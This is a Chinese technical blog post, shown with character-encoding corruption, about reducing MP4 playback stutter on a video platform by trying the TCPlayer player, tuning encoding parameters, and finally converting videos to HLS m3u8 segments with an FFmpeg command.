<p>æˆ‘ä»¬çš„è§†é¢‘ç”¨çš„æ ¼å¼æ˜¯ mp4ï¼Œåœ¨æ’­æ”¾æ—¶å¸¸å‡ºç°å¡é¡¿ç°è±¡ï¼Œå°¤å…¶å¯¹äºè¾ƒå¤§çš„æ–‡ä»¶ï¼Œæ‹–åŠ¨æ—¶åŠ è½½å¡é¡¿æ›´åŠ æ˜æ˜¾ï¼Œä»¥ä¸‹æ˜¯ä¸ªæä¾›ä¸ªæ¼”ç¤ºè§†é¢‘ä¾›å¤§å®¶æ„Ÿå—ä¸€ä¸‹ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8ac8b8ed3a404e4093e00658936ed7a9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447009&amp;x-signature=I0wk1OVz5NI0wYk1hqGKoAtLleE%3D" alt="mp4-demo.gif" loading="lazy"/></p>
<h2 data-id="heading-2">è§£å†³æ–¹æ¡ˆ</h2>
<p>é’ˆå¯¹ä»¥ä¸Šä¸šåŠ¡åå¤çš„è¯´å¡é¡¿é—®é¢˜ï¼Œæˆ‘ä»¬å®åœ¨æ˜¯æ‰›ä¸ä½äº†ï¼Œäºæ˜¯ä¸‹å®šå†³å¿ƒæ˜¯è¦è§£å†³è¿™ä¸ªé—®é¢˜ã€‚æˆ‘ä»¬å…ˆåæŠ˜è…¾äº†å‡ ä¸ªæ–¹æ¡ˆï¼Œä½†æ˜¯æ•ˆæœä¸ä½³ï¼Œç›´åˆ°æœ€åä¸€ä¸ªæ–¹æ¡ˆï¼ˆå³æµåª’ä½“æ ¼å¼ï¼‰ï¼ŒåŠ ä¸Šåˆ‡æ¢å…¨æ–°çš„æ’­æ”¾å™¨ï¼Œæ‰ç®—æ˜¯è§£å†³åˆ°äº†é—®é¢˜çš„æ ¹æœ¬ï¼Œä»¥ä¸‹æ˜¯æˆ‘ä»¬æŠ˜è…¾çš„å‡ ä¸ªæ–¹æ¡ˆçš„è¿‡ç¨‹ã€‚</p>
<h3 data-id="heading-3">1. å…¨æ–°æ”¹é€ ï¼šæ­è½½è…¾è®¯äº‘ TCPlayer æ’­æ”¾å™¨</h3>
<p>ç”±äºå¯¹äºè§†é¢‘å¡é¡¿çš„åº•å±‚åŸç†ç ”ç©¶æ¯”è¾ƒæµ…ï¼Œæœ€å¼€å§‹è§‰çš„å¡é¡¿æ˜¯ä¸æ˜¯æ¢ä¸€ä¸ªæ’­æ”¾å™¨å°±å¯ä»¥å¾—ä»¥è§£å†³ï¼Œäºæ˜¯å¯¹æ¯”äº†å¸‚é¢ä¸Šçš„ä¸€äº›æ’­æ”¾å™¨ï¼Œç›¸å¯¹æ¥è¯´ï¼Œè…¾è®¯çš„ TCPlayer æ¯”è¾ƒæˆç†Ÿä¸”ç¬¦åˆå¼€å‘æ¡ä»¶ï¼Œå› æ­¤å°±å°è¯•æ”¹é€ èµ·æ¥ã€‚</p>
<p>æˆ‘ä»¬ä»å®˜ç½‘äº†è§£åˆ°ï¼ŒTCPlayer æœ‰è®¸å¤šä¼˜åŠ¿ï¼Œå…¶ä¸­ä¸»è¦å…·æœ‰ä»¥ä¸‹ç‰¹å¾ï¼š</p>
<ul>
<li>é«˜æ€§èƒ½æ’­æ”¾ï¼šTCPlayer å…·å¤‡å“è¶Šçš„æ€§èƒ½ï¼Œåœ¨å„ç§ç½‘ç»œç¯å¢ƒä¸‹æä¾›æµç•…ã€ç¨³å®šçš„è§†é¢‘æ’­æ”¾ä½“éªŒã€‚</li>
<li>å¤šæ ¼å¼æ”¯æŒï¼šTCPlayer æ”¯æŒå¤šç§å¸¸è§çš„è§†é¢‘æ ¼å¼ï¼ŒåŒ…æ‹¬ MP4ã€FLVã€HLSã€M3U8 ç­‰ï¼Œä»¥é€‚åº”ä¸åŒçš„éœ€æ±‚å’Œåœºæ™¯ã€‚</li>
<li>è‡ªé€‚åº”ç ç‡ï¼šTCPlayer æ”¯æŒè‡ªé€‚åº”ç ç‡æŠ€æœ¯ï¼Œæ ¹æ®è§‚ä¼—çš„ç½‘ç»œç¯å¢ƒåŠ¨æ€è°ƒæ•´è§†é¢‘çš„ç ç‡å’Œåˆ†è¾¨ç‡ï¼Œç¡®ä¿é«˜è´¨é‡çš„æ’­æ”¾å’Œè¾ƒä½çš„å¡é¡¿ç‡ã€‚</li>
<li>å¼ºå¤§çš„åŠŸèƒ½æ‰©å±•ï¼šTCPlayer æä¾›ä¸°å¯Œçš„åŠŸèƒ½æ‰©å±•æ¥å£å’Œæ’ä»¶æœºåˆ¶ï¼Œå¯ä»¥æ ¹æ®ä¸šåŠ¡éœ€æ±‚è¿›è¡Œçµæ´»çš„æ‹“å±•å’Œå®šåˆ¶ã€‚</li>
<li>å¤šå¹³å°å…¼å®¹ï¼šTCPlayer å¯ä»¥åœ¨å¤šä¸ªå¹³å°ä¸Šä½¿ç”¨ï¼ŒåŒ…æ‹¬ç½‘é¡µã€ç§»åŠ¨åº”ç”¨å’Œå…¶ä»–è®¾å¤‡ã€‚å®ƒæä¾›äº†é€‚é…ä¸åŒå¹³å°çš„å¼€å‘å·¥å…·å’Œæ–‡æ¡£ã€‚</li>
<li>å…¨é¢çš„æ§åˆ¶ä¸äº¤äº’ï¼šTCPlayer æ”¯æŒå…¨é¢çš„æ’­æ”¾æ§åˆ¶å’Œç”¨æˆ·äº¤äº’åŠŸèƒ½ï¼Œå¦‚æ’­æ”¾ã€æš‚åœã€è·³è½¬ã€å…¨å±ç­‰ï¼Œä½¿ç”¨æˆ·èƒ½å¤Ÿæ–¹ä¾¿åœ°æ“ä½œå’Œæ§åˆ¶è§†é¢‘æ’­æ”¾ã€‚</li>
</ul>
<p>ä»é¡µé¢ä¸Šæ˜¾ç¤ºæ•ˆæœå¦‚ä¸‹ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4daf85120027499c84e405ad70259017~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447009&amp;x-signature=X%2Ff9QJqUM0Xm1jAP36hNWEeA0Q0%3D" alt="æ’­æ”¾å™¨æ ·å¼" loading="lazy"/></p>
<p>äºæ˜¯å†³å®šå°† h5 æ’­æ”¾å™¨æ”¹æˆè…¾è®¯äº‘çš„æ’­æ”¾å™¨ï¼Œè°ƒç ”æµ‹è¯•äº†ä¸€ä¸‹ï¼Œé¡µé¢æ ·å¼ç¡®å®ç¾è§‚äº†å¾ˆå¤šï¼Œèƒ½å¤Ÿè§£å†³äº†è¿‡å»å¤šä¸ªç«¯æ ·å¼ä¸ä¸€è‡´çš„é—®é¢˜ã€‚ä½†ä»åº•å±‚æ¥çœ‹ï¼Œè¿˜æ˜¯æ²¡æœ‰è§£å†³æ ¹æœ¬é—®é¢˜ï¼ŒåŒæ—¶ä¹Ÿå¸¦æ¥äº†å¦å¤–ä¸€ä¸ªé—®é¢˜ä»£ç æ”¹é€ æˆæœ¬è¿‡é«˜ï¼Œéšä¹‹ä¹Ÿå¸¦æ¥ç»´æŠ¤æˆæœ¬é«˜ã€‚åŸºäºé—®é¢˜è§£å†³çš„æ€è·¯è€ƒè™‘ï¼Œæˆ‘ä»¬å°†è¿™ä¸ªæ–¹æ¡ˆæš‚å®šã€‚</p>
<p>å‚è€ƒæ–‡æ¡£ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.tencent.com%2Fdocument%2Fproduct%2F454%2F7503" title="https://cloud.tencent.com/document/product/454/7503" target="_blank" ref="nofollow noopener noreferrer">ç›´æ’­ SDK Webï¼ˆTCPlayerï¼‰-æ—  UI é›†æˆæ–¹æ¡ˆ-æ–‡æ¡£ä¸­å¿ƒ-è…¾è®¯äº‘</a></p>
<h3 data-id="heading-4">2. å¼ºåŒ–ä¼˜åŒ–ï¼šä¼˜åŒ–è§†é¢‘åˆ†è¾¨ç‡ã€ç¼–ç ç­‰å‚æ•°å‡å°‘ä½“ç§¯</h3>
<p>å½’æ ¹åˆ°åº•æˆ‘ä»¬è¿˜æ˜¯æƒ³ä»è§†é¢‘çš„åº•å±‚å±æ€§ä¸Šå»åšä¸€äº›ä¼˜åŒ–ï¼Œæˆ‘ä»¬äº†è§£åˆ°è§†é¢‘ä»–æœ‰å¾ˆå¤šå¯æ§çš„å‚æ•°ï¼Œä»å¤–éƒ¨æ”¶é›†äº†ä¸€äº›ä¿¡æ¯ï¼Œå¯¹äºå½±å“è§†é¢‘æ’­æ”¾é€Ÿåº¦çš„å› ç´ æœ‰ï¼š</p>
<ul>
<li>è§†é¢‘æ¯”ç‰¹ç‡ï¼šæŒ‡è§†é¢‘æ–‡ä»¶ä¸­æ¯ç§’ä¼ è¾“çš„æ¯”ç‰¹æ•°ï¼Œé€šå¸¸ä»¥â€œæ¯”ç‰¹/ç§’â€ï¼ˆbpsï¼‰æˆ–â€œåƒæ¯”ç‰¹/ç§’â€ï¼ˆKbpsï¼‰ä¸ºå•ä½ã€‚æ¯”ç‰¹ç‡å†³å®šäº†è§†é¢‘çš„ç”»é¢è´¨é‡å’Œæ–‡ä»¶å¤§å°ï¼Œè¾ƒé«˜çš„æ¯”ç‰¹ç‡é€šå¸¸ä¼šå¸¦æ¥æ›´å¥½çš„ç”»é¢è´¨é‡ï¼Œä½†ä¼šå¯¼è‡´æ–‡ä»¶æ›´å¤§ã€‚</li>
<li>å…³é”®å¸§ï¼šå…³é”®å¸§ï¼ˆä¹Ÿç§°ä¸º I å¸§ï¼‰åœ¨è§†é¢‘ç¼–ç ä¸­èµ·ç€é‡è¦ä½œç”¨ï¼Œå®ƒä»¬æ˜¯è§†é¢‘åºåˆ—ä¸­å®Œæ•´è‡ªèº«çš„å¸§ï¼Œè€Œå…¶ä»–å¸§ï¼ˆP å¸§å’Œ B å¸§ï¼‰åˆ™æ˜¯é€šè¿‡å‚è€ƒå…¶ä»–å¸§è¿›è¡Œå‹ç¼©ç¼–ç çš„ã€‚è°ƒæ•´å…³é”®å¸§é—´éš”ä¼šå½±å“è§†é¢‘çš„å‹ç¼©æ•ˆç‡ã€ç”»é¢è´¨é‡å’Œæ’­æ”¾æ€§èƒ½ã€‚</li>
<li>å¸§ç‡ï¼šè°ƒæ•´å¸§ç‡æ˜¯æŒ‡æ›´æ”¹è§†é¢‘ä¸­æ¯ç§’æ˜¾ç¤ºçš„å¸§æ•°ã€‚è§†é¢‘å¸§ç‡æ˜¯æŒ‡æ¯ç§’æ˜¾ç¤ºçš„å›¾åƒæ•°é‡ï¼Œé€šå¸¸ä»¥â€œå¸§/ç§’â€ï¼ˆfpsï¼‰ä¸ºå•ä½ã€‚è°ƒæ•´å¸§ç‡ä¼šå½±å“è§†é¢‘æ’­æ”¾çš„æµç•…åº¦ã€è§†è§‰æ„Ÿå—ä»¥åŠæ–‡ä»¶å¤§å°ã€‚</li>
<li>éŸ³é¢‘æ¯”ç‰¹ç‡ï¼šéŸ³é¢‘æ¯”ç‰¹ç‡æ˜¯æŒ‡åœ¨éŸ³é¢‘ç¼–ç ä¸­æ¯ç§’ä¼ è¾“çš„æ¯”ç‰¹æ•°ï¼Œå®ƒä¼šç›´æ¥å½±å“éŸ³é¢‘çš„è´¨é‡å’Œæ–‡ä»¶å¤§å°ã€‚é€‰æ‹©é€‚å½“çš„éŸ³é¢‘æ¯”ç‰¹ç‡éœ€è¦ç»¼åˆè€ƒè™‘éŸ³é¢‘è´¨é‡ã€å­˜å‚¨ç©ºé—´å’Œå¸¦å®½è¦æ±‚ç­‰å› ç´ ã€‚</li>
</ul>
<p>ç»¼åˆè€ƒè™‘ä»¥ä¸Šå› ç´ ï¼Œä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„éŸ³é¢‘æ¯”ç‰¹ç‡é€‰æ‹©ï¼š</p>
<ul>
<li><strong>64 kbps</strong>ï¼š é€‚ç”¨äºä½å¸¦å®½ç¯å¢ƒå’Œéœ€è¦èŠ‚çœå­˜å‚¨ç©ºé—´çš„æƒ…å†µã€‚éŸ³é¢‘è´¨é‡å¯èƒ½ä¼šæœ‰æ‰€é™ä½ã€‚</li>
<li><strong>128 kbps</strong>ï¼š æ˜¯è®¸å¤šåœ¨çº¿éŸ³é¢‘å’Œè§†é¢‘å¹³å°çš„é»˜è®¤éŸ³é¢‘æ¯”ç‰¹ç‡ã€‚æä¾›äº†è¾ƒå¥½çš„éŸ³é¢‘è´¨é‡ï¼Œå¹¶ä¸”åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹èƒ½å¤Ÿæ»¡è¶³è§‚ä¼—éœ€æ±‚ã€‚</li>
<li><strong>192 kbps</strong> æˆ–æ›´é«˜ï¼š å¯¹äºéœ€è¦é«˜éŸ³è´¨çš„éŸ³é¢‘å†…å®¹ï¼Œå¦‚éŸ³ä¹æˆ–ä¸“ä¸šå½•åˆ¶ï¼Œå¯ä»¥é€‰æ‹©è¾ƒé«˜çš„æ¯”ç‰¹ç‡ã€‚</li>
<li>é‡‡æ ·ç‡ï¼šéŸ³é¢‘é‡‡æ ·ç‡æ˜¯æŒ‡åœ¨éŸ³é¢‘æ•°å­—åŒ–è¿‡ç¨‹ä¸­æ¯ç§’å¯¹åŸå§‹éŸ³é¢‘ä¿¡å·è¿›è¡Œé‡‡æ ·çš„æ¬¡æ•°ã€‚é‡‡æ ·ç‡ä¼šå½±å“éŸ³é¢‘çš„é¢‘ç‡èŒƒå›´å’Œè´¨é‡ã€‚</li>
</ul>
<p>å¸¸è§çš„éŸ³é¢‘é‡‡æ ·ç‡åŒ…æ‹¬ 44.1 kHz å’Œ 48 kHzã€‚è¿™äº›é‡‡æ ·ç‡åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹å·²ç»èƒ½å¤Ÿæä¾›è¶³å¤Ÿçš„éŸ³é¢‘è´¨é‡ã€‚</p>
<ul>
<li><strong>44.1 kHz</strong>ï¼š è¿™æ˜¯ CD éŸ³è´¨çš„æ ‡å‡†é‡‡æ ·ç‡ï¼Œè¢«å¹¿æ³›ç”¨äºéŸ³ä¹ã€è¯­éŸ³å’Œä¸€èˆ¬çš„éŸ³é¢‘å†…å®¹ã€‚è¿™ç§é‡‡æ ·ç‡èƒ½å¤Ÿæ•æ‰äººè€³æ‰€èƒ½å¬åˆ°çš„å¤§éƒ¨åˆ†é¢‘ç‡èŒƒå›´ã€‚</li>
<li><strong>48 kHz</strong>ï¼š è¿™æ˜¯è§†é¢‘åˆ¶ä½œã€å¹¿æ’­å’Œè®¸å¤šæ•°å­—éŸ³é¢‘å·¥ä½œæµä¸­å¸¸ç”¨çš„é‡‡æ ·ç‡ã€‚å®ƒå¯ä»¥é€‚åº”æ›´å¹¿æ³›çš„éŸ³é¢‘éœ€æ±‚ï¼Œå¹¶ä¸”åœ¨ä¸“ä¸šé¢†åŸŸä¸­ä½¿ç”¨è¾ƒå¤šã€‚</li>
</ul>
<p>åŸºäºä»¥ä¸Šçš„å±æ€§é…ç½®ï¼Œæˆ‘ä»¬å†…éƒ¨æµ‹è¯•äº†ä¸€ä¸‹ï¼Œæ”¹å–„é…ç½®ç¡®å®èƒ½å°†è§†é¢‘ä½“ç§¯å˜å°ï¼Œéšä¹‹åŠ è½½é€Ÿåº¦ä¹Ÿå°±ç›¸å¯¹å¿«ä¸€ç‚¹ï¼Œäºæ˜¯è·Ÿ RD ä¸€èµ·è°ƒè¯•äº†ä¸€ä¸ªç¬¦åˆæˆ‘ä»¬å¹³å°å¤Ÿç”¨çš„ä¸€ä¸ªå‚æ•°é…ç½®ï¼Œæœ€åè·Ÿä¸šåŠ¡è¾¾æˆä¸€è‡´ï¼Œåç»­ä¸Šä¼ è§†é¢‘ä¹‹å‰æ ¹æ®è¿™ä¸ªå‚æ•°è½¬ä¸€ä¸‹ç ã€‚</p>
<p>è½¬ç å·¥å…·é…ç½®å›¾ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1e4b80c3ae7d40a894a57dd8654e2bcc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447009&amp;x-signature=eSVYA%2B1WK2LCEfWxILxCjY%2B%2BDKc%3D" alt="è§†é¢‘è½¬æ¢å·¥å…·" loading="lazy"/></p>
<p>äºæ˜¯æˆ‘ä»¬æ¢³ç†äº†ä¸€ä¸‹è§„èŒƒæ–‡æ¡£ï¼Œè®©ä¸Šé—¨ä¸šåŠ¡æŒ‰ç…§è¿™ä¸ªæ–¹æ³•æ¥å‡è½»è§†é¢‘æ’­æ”¾çš„å¡é¡¿ã€‚ä¸Šé—¨ä¸šåŠ¡ç”¨äº†è¿™å¥—è§„èŒƒä¹‹åï¼Œèƒ½å¤Ÿå¤§ç¨‹åº¦å‡å°‘ä»–ä»¬å­¦ä¹ çš„å¡é¡¿é—®é¢˜ï¼Œåé¢åé¦ˆçš„é¢‘ç‡ç›¸å¯¹æ¯”è¾ƒä½ã€‚</p>
<p>ä½†åˆ°åæ¥ï¼Œå…¶ä»–ä¸šåŠ¡ä¹Ÿç”¨ä¸Šäº†è¯¥å¹³å°ï¼Œç”±äºè§„èŒƒæ–‡æ¡£å¾ˆéš¾æ‹‰é½ï¼Œä»–ä»¬å°±ä¼šæŒ‰ç…§è‡ªå·±çš„æ–¹å¼ç›´æ¥å°†è§†é¢‘ä¸Šä¼ äº†ï¼Œå¦‚æœè§†é¢‘æ¯”è¾ƒå¤§ï¼Œé‚£å®¹æ˜“å¯¼è‡´è§†é¢‘æ’­æ”¾å¡é¡¿ã€‚å³ä½¿æ‹‰é½äº†ï¼Œè¿˜æ˜¯æœ‰ä¸€å®šç¨‹åº¦çš„å¡é¡¿ã€‚æ‰€ä»¥åœ¨è¿™ä¸ªæ–¹æ¡ˆé‡Œï¼Œå¸¦æ¥çš„ä¸€ä¸ªå¼Šç«¯å°±æ˜¯æ¯æ¬¡ä¸Šä¼ è§†é¢‘ä¹‹å‰éƒ½è¦å‹ç¼©ä¸€éï¼Œå¹¶ä¸”ä¹Ÿä¸èƒ½å®Œå…¨è§£å†³é—®é¢˜ï¼Œè¿™å¹¶ä¸æ˜¯å¤§å®¶æƒ³è¦çš„ä¸€ä¸ªç»“æœã€‚</p>
<h3 data-id="heading-5">3. ç²¾å¦™åº”ç”¨ï¼šé‡‡ç”¨ HLS æµåª’ä½“ç±»å‹æµç•…æ’­æ”¾</h3>
<p>ç»è¿‡å……åˆ†èµ„æ–™çš„è°ƒç ”ï¼Œå¹¶ä¸”è·Ÿä¸€äº›æ‡‚é¢†åŸŸçš„æŠ€æœ¯ä¼™ä¼´æ²Ÿé€šäº¤æµï¼Œä»–è¯´é“ï¼š"å¯ä»¥é‡‡ç”¨æµåª’ä½“æ–¹å¼æ’­æ”¾ï¼Œç°åœ¨å¾ˆå°‘äººç”¨ mp4 æ’­æ”¾äº†ï¼Œåˆ‡ç‰‡æ‰æ˜¯ç‹é“ã€‚"ï¼Œäºæ˜¯å†³å®šç”¨æµåª’ä½“æ–¹å¼æ’­æ”¾çœ‹çœ‹ã€‚</p>
<p>è¿™é‡Œæµåª’ä½“ä¸»è¦ç”¨çš„æ˜¯ m3u8 æ ¼å¼ï¼Œm3u8 æ˜¯ä¸€ç§åŸºäºæ–‡æœ¬çš„åª’ä½“æ’­æ”¾åˆ—è¡¨æ ¼å¼ï¼Œå¸¸ç”¨äºæµåª’ä½“ä¼ è¾“ã€‚å®ƒå¯ä»¥å°†è§†é¢‘åˆ‡ç‰‡æˆå¤šä¸ªå°çš„ .ts æ–‡ä»¶ï¼Œå¹¶é€šè¿‡ m3u8 æ–‡ä»¶è¿›è¡Œç´¢å¼•å’Œæ§åˆ¶ã€‚m3u8 æ ¼å¼é€‚ç”¨äºå®æ—¶æµåª’ä½“ä¼ è¾“ï¼Œå¦‚ç›´æ’­ã€åœ¨çº¿è§†é¢‘ç­‰ï¼Œå¹¶å…·æœ‰è‡ªé€‚åº”ç ç‡ç‰¹æ€§ï¼Œå¯ä»¥æ ¹æ®ç½‘ç»œæ¡ä»¶åŠ¨æ€è°ƒæ•´è§†é¢‘çš„è´¨é‡ã€‚</p>
<p>æˆ‘ä»¬è¿™åšäº†ä¸ª Demo è¿›è¡Œå¯¹æ¯”ï¼Œè§†é¢‘æ—¶é•¿ 6 åˆ†é’Ÿå¤šï¼Œå¤§å° 290m å·¦å³ï¼ŒåŠ è½½é€Ÿåº¦å¯¹æ¯”å¦‚ä¸‹ï¼š</p>
<p>mp4 demoï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0ad808bbccb64f27b6678ad1658105d2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447009&amp;x-signature=zwLAEtWgaai35mHqygldWcPgw8o%3D" alt="mp4-demo.gif" loading="lazy"/></p>
<p>m3u8 demoï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0512468c44f84621a4ed7b840c76c861~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447009&amp;x-signature=EQlGMpkSR%2Fu90qqFqKPds%2FtPc1o%3D" alt="m3u8-demo.gif" loading="lazy"/></p>
<p>æ˜æ˜¾èƒ½æ„Ÿè§‰ä¸‹é¢çš„åˆ‡ç‰‡æ–¹å¼ï¼ŒåŠ è½½é€Ÿåº¦ä¼šç›¸å¯¹å¿«å¾ˆå¤šï¼Œè¿™ä¸ªæµ‹è¯•å¾—äºˆéªŒè¯ä¹‹åï¼Œå¼€å§‹è½å®æˆ‘ä»¬çš„ä¸šåŠ¡æŠ€æœ¯å®ç°ã€‚</p>
<p>ç›®å‰ç”¨çš„è§†é¢‘æ ¼å¼æ˜¯ mp4ï¼Œæˆ‘ä»¬æƒ³äº†å‡ ä¸ªå°† mp4 è½¬æˆ m3u8 æµåª’ä½“æ ¼å¼çš„æ–¹æ¡ˆã€‚</p>
<p>1ï¼‰<strong>é‡‡ç”¨è…¾è®¯äº‘è½¬ç æ¥å£</strong>ï¼šç”±äºæˆ‘ä»¬äº‘å‚¨å­˜éƒ½æ˜¯ç”¨çš„è…¾è®¯äº‘ï¼Œçœ‹èƒ½ä¸èƒ½ç›´æ¥ç”¨è…¾è®¯äº‘çš„æ¥å£ã€‚è…¾è®¯äº‘è½¬ç æ˜¯éœ€è¦æ”¶è´¹çš„ï¼ŒæŒ‰ç…§è§†é¢‘çš„é•¿åº¦æ¥ç®—ï¼Œæ¯”å¦‚ä¸€ä¸ªè§†é¢‘ 6 åˆ†é’Ÿï¼Œæ¯åˆ†é’Ÿæ”¶è´¹ 1 å—é’±ï¼Œé‚£ä¹ˆè½¬ç è¿™ä¸ªè§†é¢‘å°±éœ€è¦æ”¶èµ· 6 å—é’±çš„è´¹ç”¨ï¼Œä¸€å¤©ä¸Šä¼  20 ä¸ªè§†é¢‘çš„è¯ï¼Œä¸€å¤© 120 å…ƒï¼Œä¸€å¹´å°± 43800 å…ƒï¼Œè¿˜æ˜¯æœ‰ä¸€å®šæˆæœ¬çš„ï¼ŒåŸºäºè¿™ä¸ªè€ƒè™‘ï¼Œæš‚æ—¶å¾…å®šã€‚</p>
<p>2ï¼‰<strong>å‰ç«¯å®ç°æ–‡ä»¶è½¬ç æœåŠ¡</strong>ã€‚å¯ä»¥é‡‡ç”¨ FFmpeg å¯¹æ–‡ä»¶è¿›è¡Œå¤„ç†ï¼ŒFFmpeg åŠŸèƒ½éå¸¸å¼ºå¤§ï¼Œæä¾›äº†ä¸°å¯Œå‘½ä»¤å’Œæ–¹æ³•ï¼Œä»¥ä¸‹æ˜¯è¯¥å·¥å…·çš„ä¸»è¦åŠŸèƒ½ï¼š</p>
<ul>
<li>éŸ³é¢‘/è§†é¢‘ç¼–ç å’Œè§£ç ï¼šFFmpeg æ”¯æŒå¤šç§éŸ³é¢‘å’Œè§†é¢‘ç¼–ç æ ¼å¼ï¼Œå¯ä»¥è¿›è¡Œç¼–ç å’Œè§£ç æ“ä½œã€‚</li>
<li>è§†é¢‘è½¬ç å’Œæ ¼å¼è½¬æ¢ï¼šFFmpeg å¯ä»¥å°†ä¸€ä¸ªè§†é¢‘æ–‡ä»¶è½¬æ¢ä¸ºä¸åŒçš„æ ¼å¼ï¼Œå¦‚ä» MP4 è½¬æ¢ä¸º AVIã€FLVã€MKV ç­‰ã€‚</li>
<li>è§†é¢‘å‰ªè¾‘å’Œè£å‰ªï¼šFFmpeg å¯ä»¥å°†è§†é¢‘æ–‡ä»¶è¿›è¡Œå‰ªè¾‘ã€è£å‰ªå’Œæ‹¼æ¥ï¼Œå®ç°è§†é¢‘çš„ç¼–è¾‘å’Œåˆå¹¶ã€‚</li>
<li>å›¾ç‰‡å’Œè§†é¢‘å¤„ç†ï¼šFFmpeg å¯ä»¥ä»è§†é¢‘ä¸­æå–å¸§ï¼Œä¹Ÿå¯ä»¥å°†å¤šä¸ªå›¾ç‰‡åˆæˆä¸ºè§†é¢‘ã€‚</li>
<li>å½•åˆ¶å’Œè½¬æ’­ï¼šFFmpeg å¯ä»¥é€šè¿‡æ•è·éŸ³é¢‘å’Œè§†é¢‘è¾“å…¥è¿›è¡Œå®æ—¶å½•åˆ¶å’Œè½¬æ’­ã€‚</li>
<li>æµåª’ä½“ä¼ è¾“ï¼šFFmpeg æ”¯æŒå°†éŸ³é¢‘å’Œè§†é¢‘å®æ—¶ä¼ è¾“åˆ°ç½‘ç»œä¸­ï¼Œç”¨äºå®ç°æµåª’ä½“æœåŠ¡ã€‚</li>
<li>éŸ³é¢‘å’Œè§†é¢‘è¿‡æ»¤ï¼šFFmpeg æä¾›äº†ä¸°å¯Œçš„éŸ³é¢‘å’Œè§†é¢‘è¿‡æ»¤å™¨ï¼Œå¯ä»¥å®ç°é™å™ªã€å»æ°´å°ã€è°ƒæ•´äº®åº¦å¯¹æ¯”åº¦ç­‰åŠŸèƒ½ã€‚</li>
<li>åª’ä½“ä¿¡æ¯è§£æï¼šFFmpeg å¯ä»¥è§£æéŸ³é¢‘å’Œè§†é¢‘æ–‡ä»¶çš„å…ƒæ•°æ®ä¿¡æ¯ï¼Œå¦‚åˆ†è¾¨ç‡ã€ç¼–ç å™¨ã€ç ç‡ç­‰ã€‚</li>
</ul>
<p>è¿™åªæ˜¯ FFmpeg çš„ä¸€äº›ä¸»è¦åŠŸèƒ½ï¼Œå®ƒè¿˜æœ‰æ›´å¤šçš„ç”¨é€”å’ŒåŠŸèƒ½ï¼Œå¯æ ¹æ®å…·ä½“éœ€æ±‚è¿›è¡Œæ·±å…¥å­¦ä¹ å’Œä½¿ç”¨ã€‚</p>
<p>è¿™æ¥è®²ä¸‹å‰ç«¯ Node å¤§è‡´å®ç°æ€è·¯ï¼š</p>
<p>a. åç«¯å¯¹å‰ç«¯ä¸Šä¼ è¿‡æ¥çš„æ–‡ä»¶é€šè¿‡ FFmpeg åŒ…è¿›è¡Œå¤„ç†ï¼Œå°†å…¶è½¬æˆ m3u8 åŠ ts æ–‡ä»¶æ ¼å¼ï¼›</p>
<p>åº•å±‚å‘½ä»¤å®ç°å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-css" lang="css">ffmpeg -<span class="hljs-selector-tag">i</span> <span class="hljs-selector-tag">input</span><span class="hljs-selector-class">.mp4</span> -hls_time <span class="hljs-number">10</span> -hls_list_size <span class="hljs-number">0</span> -y output<span class="hljs-selector-class">.m3u8</span>
</code></pre>
<p>ç”Ÿæˆçš„æ–‡ä»¶åˆ‡ç‰‡ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/044be02f75db42278e7fe8fa61727b1e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768447009&amp;x-signature=KdFfkZLhXzuoB69GdVOCO6EguAY%3D" alt="m3u8åˆ‡ç‰‡" loading="lazy"/></p>
<p>b. ç„¶åå°†è¾“å‡ºçš„ m3u8 åŠ ts çš„ç›¸å…³æ–‡ä»¶ä¸Šä¼ åˆ°äº‘å‚¨å­˜é‡Œå»ï¼›</p>
<p>c. è¿”å› m3u8 åœ°å€ç»™å‰ç«¯ï¼›</p>
